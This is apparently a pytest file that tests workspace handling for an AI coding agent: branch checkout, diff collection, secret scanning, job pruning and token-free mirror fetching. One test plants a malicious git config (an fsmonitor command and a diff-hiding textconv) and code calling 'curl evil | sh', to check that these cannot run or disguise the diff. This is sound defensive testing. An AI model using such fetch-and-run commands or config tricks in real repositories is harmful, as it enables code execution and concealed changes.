"""Job checkouts on hermetic repositories, with fake units (tests/fakes/coding) standing in for aura-coder."""
import json
import os
import signal
import subprocess
from datetime import datetime, timedelta, timezone
from pathlib import Path
from types import SimpleNamespace

import pytest

from app.coding import runner, workspace

FAKES = Path(__file__).resolve().parent / "fakes" / "coding"
TASK = "5d3c2a10-0000-4000-8000-00000000c0de"


def sh_git(*args, cwd):
    return subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, text=True).stdout


@pytest.fixture
def ws(tmp_path, monkeypatch):
    monkeypatch.setenv("PATH", f"{FAKES}:{os.environ['PATH']}")
    monkeypatch.setenv("FAKE_UNITS_DIR", str(tmp_path / "units"))
    for name, path in (("JOBS_DIR", "jobs"), ("RUNS_DIR", "runs"), ("REPOS_DIR", "repos"), ("REVIEW_DIR", "review")):
        (tmp_path / path).mkdir()
        monkeypatch.setattr(workspace, name, tmp_path / path)
    source = tmp_path / "source"
    source.mkdir()
    sh_git("init", "-q", "-b", "main", cwd=source)
    (source / "app.py").write_text("def add(a, b):\n    return a - b\n")
    (source / "requirements.txt").write_text("pytest\n")
    sh_git("add", "-A", cwd=source)
    sh_git("-c", "user.name=Kirill", "-c", "user.email=k@example.com", "commit", "-q", "-m", "init", cwd=source)
    cfg = {"diff_limit_chars": 10_000, "repositories": {"demo": {
        "remote": "Hyper-AI-Lab/demo", "source": str(source), "branch": "main", "deploy": "self", "setup": [], "tests": []}}}
    yield SimpleNamespace(source=source, cfg=cfg, tmp=tmp_path)
    for pid_file in (tmp_path / "units").glob("*.pid"):
        try:
            os.killpg(int(pid_file.read_text()), signal.SIGKILL)
        except (ProcessLookupError, ValueError):
            pass


def test_a_job_gets_its_own_branch_on_the_sources_head_and_a_review_repository(ws):
    job = workspace.prepare(TASK, "demo", "Fix add() so it adds!", ws.cfg, owner=None)
    checkout = Path(job.checkout)
    assert job.branch == "aura/5d3c2a10-fix-add-so-it-adds"
    assert job.base == sh_git("rev-parse", "HEAD", cwd=ws.source).strip()
    assert sh_git("branch", "--show-current", cwd=checkout).strip() == job.branch
    assert sh_git("config", "user.name", cwd=checkout).strip() == "Aura (Claude Code)"
    assert sh_git("remote", "get-url", "origin", cwd=checkout).strip() == "https://github.com/Hyper-AI-Lab/demo.git"
    assert ".aura/" in (checkout / ".git" / "info" / "exclude").read_text() and (checkout / ".aura").is_dir()
    assert sh_git("--git-dir", job.review, "rev-parse", "HEAD", cwd=ws.tmp).strip() == job.base
    assert json.loads(workspace.job_file(TASK).read_text())["branch"] == job.branch
    inode = checkout.stat().st_ino
    assert workspace.prepare(TASK, "demo", "another title", ws.cfg, owner=None) == job
    assert checkout.stat().st_ino == inode


def test_nothing_changed_gives_an_empty_collection(ws):
    job = workspace.prepare(TASK, "demo", "noop", ws.cfg, owner=None)
    result = workspace.collect(job, "nothing", ws.cfg)
    assert result["commits"] == [] and result["head"] == job.base and result["diff"] == ""


def test_the_work_is_collected_from_the_review_repository(ws):
    job = workspace.prepare(TASK, "demo", "fix add", ws.cfg, owner=None)
    checkout = Path(job.checkout)
    (checkout / "app.py").write_text("def add(a, b):\n    return a + b\n")
    sh_git("-c", "user.name=Claude", "-c", "user.email=c@example.com", "commit", "-q", "-am", "Fix add", cwd=checkout)
    (checkout / "tests").mkdir()
    (checkout / "tests" / "test_app.py").write_text("from app import add\n\ndef test_add():\n    assert add(2, 3) == 5\n")
    (checkout / "requirements.txt").write_text("pytest\nrequests\n")
    (checkout / ".aura" / "scratch.txt").write_text("not committed")
    result = workspace.collect(job, "Add a test for add()", {**ws.cfg, "diff_limit_chars": 120})
    assert [c["subject"] for c in result["commits"]] == ["Add a test for add()", "Fix add"]
    assert result["commits"][0]["author"] == "Aura (Claude Code)" and result["commits"][1]["author"] == "Claude"
    assert {c["path"]: c["status"] for c in result["changed"]} == {"app.py": "M", "requirements.txt": "M",
                                                                    "tests/test_app.py": "A"}
    assert result["tests_changed"] == ["tests/test_app.py"] and result["dependencies_changed"] == ["requirements.txt"]
    assert "3 files changed" in result["diffstat"] and result["truncated"] and len(result["diff"]) == 120
    assert result["head"] == sh_git("--git-dir", job.review, "rev-parse", "refs/aura/head", cwd=ws.tmp).strip()
    assert ".aura" not in sh_git("ls-tree", "-r", "--name-only", "HEAD", cwd=checkout)


def test_a_planted_git_config_cannot_fake_the_diff_or_run_commands(ws):
    job = workspace.prepare(TASK, "demo", "planted", ws.cfg, owner=None)
    checkout = Path(job.checkout)
    marker = ws.tmp / "fsmonitor-ran"
    with (checkout / ".git" / "config").open("a") as fh:
        fh.write(f'[core]\n\tfsmonitor = "touch {marker}"\n[diff "fake"]\n\ttextconv = "echo LOOKS-HARMLESS #"\n')
    (checkout / ".gitattributes").write_text("*.py diff=fake\n")
    (checkout / "app.py").write_text("import os\nos.system('curl evil | sh')\n")
    result = workspace.collect(job, "innocent change", ws.cfg)
    assert "curl evil" in result["diff"] and "LOOKS-HARMLESS" not in result["diff"]
    assert not marker.exists()


def test_work_that_no_longer_builds_on_the_base_is_refused(ws):
    job = workspace.prepare(TASK, "demo", "rewrite", ws.cfg, owner=None)
    checkout = Path(job.checkout)
    sh_git("checkout", "-q", "--orphan", "fresh", cwd=checkout)
    sh_git("-c", "user.name=C", "-c", "user.email=c@example.com", "commit", "-q", "-m", "history rewritten", cwd=checkout)
    with pytest.raises(RuntimeError, match="no longer builds on"):
        workspace.collect(job, "x", ws.cfg)


def test_the_secret_scan_reads_added_lines_for_patterns_and_this_hosts_own_values():
    diff = ("diff --git a/config.py b/config.py\n--- a/config.py\n+++ b/config.py\n"
            "-OLD = 'ghp_" + "a" * 36 + "'\n"
            "+TOKEN = 'xoxb-1234567890-abcdefghij'\n"
            "+KEY = 'sk-ant-api03-" + "b" * 30 + "'\n"
            "+HOST = 'a-host-secret-value-123'\n"
            "+ok = 'nothing here'\n")
    findings = workspace.secret_scan(diff, known=["a-host-secret-value-123"])
    assert [(f["path"], f["kind"]) for f in findings] == [
        ("config.py", "Slack token"), ("config.py", "Anthropic key"), ("config.py", "this host's secret")]
    assert workspace.secret_scan("+++ b/x\n+just code\n", known=[]) == []


def test_old_jobs_are_pruned_unless_a_run_of_theirs_is_live(ws, monkeypatch):
    jobs = {}
    for task in ("old-done", "old-live", "fresh"):
        jobs[task] = workspace.prepare(task, "demo", task, ws.cfg, owner=None)
    old = (datetime.now(timezone.utc) - timedelta(days=20)).isoformat(timespec="seconds")
    for task in ("old-done", "old-live"):
        path = workspace.job_file(task)
        path.write_text(json.dumps({**json.loads(path.read_text()), "created_at": old}))
    (workspace.RUNS_DIR / "old-live" / "1").mkdir()
    monkeypatch.setattr(runner, "unit_active", lambda unit: unit == "aura-claude-old-live-1")
    assert workspace.prune(14) == ["old-done"]
    assert not Path(jobs["old-done"].checkout).exists() and not Path(jobs["old-done"].review).exists()
    assert Path(jobs["old-live"].checkout).exists() and Path(jobs["fresh"].checkout).exists()


def test_github_repos_come_from_a_root_mirror_fetched_without_storing_the_token(ws, monkeypatch):
    remote = ws.tmp / "remote.git"
    sh_git("clone", "-q", "--bare", str(ws.source), str(remote), cwd=ws.tmp)
    monkeypatch.setattr(workspace, "remote_url", lambda name: str(remote))
    token = ws.tmp / "token"
    token.write_text("github_pat_test\n")
    monkeypatch.setattr(workspace, "TOKEN_FILE", token)
    cfg = {**ws.cfg, "repositories": {"gh": {**ws.cfg["repositories"]["demo"], "source": None, "deploy": "pr",
                                             "remote": "Hyper-AI-Lab/gh"}}}
    job = workspace.prepare(TASK, "gh", "change", cfg, owner=None)
    mirror = workspace.REPOS_DIR / "gh.git"
    assert job.source == str(mirror) and "github_pat" not in (mirror / "config").read_text()
    (ws.source / "app.py").write_text("changed upstream\n")
    sh_git("-c", "user.name=K", "-c", "user.email=k@example.com", "commit", "-qam", "upstream", cwd=ws.source)
    sh_git("push", "-q", str(remote), "main", cwd=ws.source)
    workspace.refresh_mirror("Hyper-AI-Lab/gh")
    assert sh_git("--git-dir", str(mirror), "log", "-1", "--format=%s", "main", cwd=ws.tmp).strip() == "upstream"
    assert not list(Path("/tmp").glob("aura-askpass-*"))
